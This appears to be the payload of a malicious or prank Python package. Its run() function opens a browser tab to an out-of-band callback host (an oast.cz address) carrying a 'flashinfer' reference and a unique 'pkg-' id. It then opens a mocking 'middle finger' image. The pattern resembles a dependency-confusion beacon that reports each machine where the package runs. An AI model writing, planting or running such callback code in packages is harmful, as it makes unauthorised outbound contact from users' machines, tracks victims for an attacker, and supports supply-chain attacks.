import webbrowser
import uuid
import threading
import time

def run():
    def open_first_url():
        # Open the first website (manual)
        uid = "pkg-" + str(uuid.uuid4())
        url1 = f"https://yojsvm7n.oast.cz?ref=flashinfer&id={uid}"
        webbrowser.open_new_tab(url1)
    
    def open_second_url():
        # Wait 2 seconds then open the second website
        time.sleep(2)
        url2 = "https://media.tenor.com/UhldNIMCzl4AAAAe/dexter-morgan-middle-finger.png"
        webbrowser.open_new_tab(url2)

    # Create the thread objects (no daemon=True)
    thread1 = threading.Thread(target=open_first_url)
    thread2 = threading.Thread(target=open_second_url)

    # Start the threads
    thread1.start()
    thread2.start()

    # Wait for both threads to finish before continuing
    thread1.join()
    thread2.join()
